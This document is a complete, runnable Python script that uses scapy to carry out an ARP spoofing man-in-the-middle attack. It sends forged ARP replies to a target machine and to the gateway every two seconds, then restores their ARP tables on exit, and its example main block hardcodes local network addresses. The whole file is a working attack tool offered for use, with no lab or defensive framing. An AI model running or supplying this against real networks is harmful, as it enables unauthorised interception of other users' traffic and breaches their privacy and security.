#!/usr/bin/env python3

import time
from scapy.all import ARP, Ether, srp, sendp, get_if_hwaddr, get_if_addr, conf
import sys
# import netifaces

conf.verbose = 0

class ARPSpoofer:
    def __init__(self, interface, target_ip, gateway_ip):
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.spoofing = False
        self.attacker_mac = get_if_hwaddr(interface)
        self.attacker_ip = get_if_addr(interface)
        
    def get_mac(self, ip):
        '''
        Get the MAC address of the target or gateway
        '''
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        try:
            answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
            return answered_list[0][1].hwsrc
        except IndexError:
            print(f"[!] Could not get MAC address for {ip}")

    def spoof(self, target_ip, spoof_ip):
        '''
        Send a spoofed ARP packet to the target or gateway
        '''
        target_mac = self.get_mac(target_ip)
        packet = Ether(dst=target_mac, src=self.attacker_mac) / ARP(op=2, 
                                                                   pdst=target_ip, 
                                                                   hwdst=target_mac,
                                                                   psrc=spoof_ip)
        sendp(packet, iface=self.interface, verbose=0)

    def restore(self, destination_ip, source_ip):
        '''
        Restore the ARP tables of the target and gateway
        '''
        destination_mac = self.get_mac(destination_ip)
        source_mac = self.get_mac(source_ip)
        packet = Ether(dst=destination_mac, src=source_mac) / ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
                    psrc=source_ip, hwsrc=source_mac)
        sendp(packet, iface=self.interface, count=4, verbose=0)

    def start(self):
        self.spoofing = True
        print(f"[*] Starting ARP spoofing attack to {self.target_ip}...")
        print(f"[*] Target: {self.target_ip}")
        print(f"[*] Gateway: {self.gateway_ip}")
        
        try:
            while self.spoofing:
                # Make the target think we are the gateway
                self.spoof(self.target_ip, self.gateway_ip)
                # Make the gateway think we are the target
                self.spoof(self.gateway_ip, self.target_ip)
                time.sleep(2)
        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        print(f"\n[*] Stopping ARP spoofing attack to {self.target_ip}...")
        self.spoofing = False
        # Restore ARP tables
        self.restore(self.target_ip, self.gateway_ip)
        self.restore(self.gateway_ip, self.target_ip)
        print("[*] ARP tables restored") 

if __name__ == "__main__":
    # Example usage
    interface = "en0"  # Change this to your network interface
    target_ip = "192.168.0.189"  # Target IP address
    gateway_ip = "192.168.0.1"  # Gateway IP address
    
    spoofer = ARPSpoofer(interface, target_ip, gateway_ip)
    spoofer.start()
